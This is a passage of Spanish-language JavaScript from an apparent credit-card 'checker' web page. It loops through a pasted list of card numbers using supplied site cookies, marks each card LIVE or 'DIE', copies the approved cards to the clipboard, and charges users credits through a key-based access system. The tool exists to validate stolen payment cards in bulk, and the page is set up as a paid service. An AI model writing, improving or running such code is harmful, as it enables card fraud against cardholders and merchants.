              if (customKeys[userSession.keyId]) {
                  customKeys[userSession.keyId].creditsAssigned = userSession.creditsAssigned;
                  saveCustomKeys(customKeys);
                  await updateSessionInfo(); // Actualiza la interfaz de la sesión
              }
              toastr.info(`-${2} créditos. Créditos restantes: ${userSession.creditsAssigned}`);
          }

        } else if (processed_text.includes("rechazada")) {
          estado = "DIE ❌";
          $("#dies").append(card + " => " + estado + "\n");
          diesCount++;
        } else {
          // Si no es LIVE ni DIE después de la limpieza y traducción, es un error
          $("#errors").append(card + " => " + estado + "\n");
          errorsCount++;
        }
      } catch (error) {
        // En caso de error de red o de fetch
        $("#errors").append(card + " => ERROR de Conexión/API ⚠️\n");
        errorsCount++;
      } finally {
        // Siempre eliminamos la tarjeta del array, actualizamos la lista y los contadores
        tarjetas.shift(); // Elimina la primera tarjeta (la que acabamos de procesar)
        updateCardListDisplay(); // Actualiza el textarea de la lista
        updateCountsDisplay(); // Actualiza los contadores en la interfaz

        // Lógica para detener si los créditos se agotan para usuarios no-admin
        if (userSession && userSession.level !== 'admin' && userSession.creditsAssigned <= 0 && checking) {
            toastr.error("⚠️ Tus créditos se han agotado. El chequeo se ha detenido.");
            stopChecker();
            return;
        }

        // Llama a la siguiente tarjeta si el chequeo sigue activo y no está pausado.
        if (checking && !paused) {
          setTimeout(checkNextCard, 100); // Pequeño retraso de 100ms
        }
      }
    }

    // Función para detener completamente el proceso de chequeo
    function stopChecker() {
      checking = false; // Establece el estado de chequeo a falso
      paused = false; // Asegura que no esté en estado pausado
      updateStatus("Detenido.");
      enableControls(true, false, false); // Habilita solo el botón de inicio
      $("#chk-pause").html('<i class="fas fa-pause"></i> Pausar'); // Restaura el texto del botón Pausar
    }

    // Evento click para el botón "Iniciar"
    $("#chk-start").click(() => {
      if (!authenticated) {
        toastr.error("Sesión no válida. Inicia sesión nuevamente.");
        showLoginScreen();
        return;
      }

      // Validar créditos antes de iniciar (para no-admins)
      if (userSession && userSession.level !== 'admin' && userSession.creditsAssigned < 2) {
          toastr.error("⚠️ No tienes suficientes créditos para iniciar el chequeo. Necesitas al menos 2 créditos.");
          return;
      }


      if (checking) return; // Evita iniciar si ya está chequeando

      cookies = $("#cookie_input").val().trim();
      // Asegurarse de obtener una copia limpia de las tarjetas cada vez que se inicia
      tarjetas = $("#lista_cartoes").val().trim().split("\n").filter(l => l.trim() !== "");

      if (!cookies) {
        toastr.error("Por favor, ingresa las cookies primero.");
        return;
      }

      if (tarjetas.length === 0) {
        toastr.warning("No se ingresaron tarjetas.");
        return;
      }

      resetContadores(); // Resetea los contadores al inicio
      totalCards = tarjetas.length; // Establece el total de tarjetas al iniciar
      updateCountsDisplay(); // Actualiza la vista para mostrar el total

      checking = true; // Indicar que el chequeo ha comenzado
      paused = false; // Asegurar que no esté pausado al inicio
      updateStatus("Chequeando...");
      enableControls(false, true, true); // Deshabilita Iniciar, habilita Pausar y Parar

      // Iniciar el chequeo para la primera tarjeta
      checkNextCard();
    });

    // Evento click para el botón "Pausar/Reanudar"
    $("#chk-pause").click(() => {
      if (!checking) return; // No hacer nada si no hay chequeo activo

      paused = !paused; // Cambia el estado de pausa
      // Cambia el texto del botón según el estado de pausa
      $("#chk-pause").html(paused ? '<i class="fas fa-play"></i> Reanudar' : '<i class="fas fa-pause"></i> Pausar');
      // Actualiza el estado en la interfaz
      updateStatus(paused ? "Pausado." : `Chequeando: ${tarjetas[0] || 'N/A'} (${testedCount}/${totalCards})`);
      
      // Si se reanuda, llamar a checkNextCard para continuar el ciclo
      if (!paused) {
        checkNextCard();
      }
    });

    // Evento click para el botón "Parar"
    $("#chk-stop").click(() => {
      stopChecker();
    });

    // Evento click para el botón "Limpiar"
    $("#chk-clean").click(() => {
      stopChecker(); // Detiene cualquier chequeo en curso
      resetContadores(); // Limpia los contadores
      $("#cookie_input").val(""); // Limpia el campo de cookies
      $("#lista_cartoes").val(""); // Limpia el campo de la lista de tarjetas
      updateStatus("Esperando inicio..."); // Restaura el estado inicial
    });

    // Evento click para el botón "Copiar" (para las lives)
    $("#copyButton").click(() => {
      const text = $("#lives").text().trim();
      if (!text) {
        toastr.warning("Nada para copiar.");
        return;
      }
      navigator.clipboard.writeText(text).then(() => {
        toastr.success("Aprobadas copiadas al portapapeles.");
      }).catch(() => {
        toastr.error("Error al copiar.");
      });
    });

    // Inicializa el estado correcto al cargar la página
    $(document).ready(async () => {
      enableControls(true, false, false); // Solo el botón de inicio habilitado al cargar
      updateStatus("Esperando inicio...");
      updateCountsDisplay(); // Asegúrate de que los contadores se muestren en cero al inicio
      
      // Verificar sesión al cargar la página (ahora asíncrono)
      await checkSession();
      
      // Event listeners para el login
      $("#loginBtn").click(handleLogin);
      $(document).on('click', '#logoutBtn', logout); // Usar event delegation
      $(document).on('click', '#adminLogoutBtn', logout); // Para el panel admin
      
      // Enter key en el input de key
      $("#keyInput").keypress((e) => {
        if (e.which === 13) { // Enter key
          handleLogin();
        }
      });
      
      // Protección adicional: verificar integridad de funciones críticas
      const criticalFunctions = [simpleHash, validateKeyAlgorithm, isSessionValid, createSession, markKeyAsUsed];
      criticalFunctions.forEach(func => {
        if (typeof func !== 'function') {
          console.error('⚠️ Función crítica comprometida');
          // Puedes decidir una acción más drástica aquí, como recargar o deshabilitar la app
          // location.reload();
        }
      });
    });
  </script>
</body>
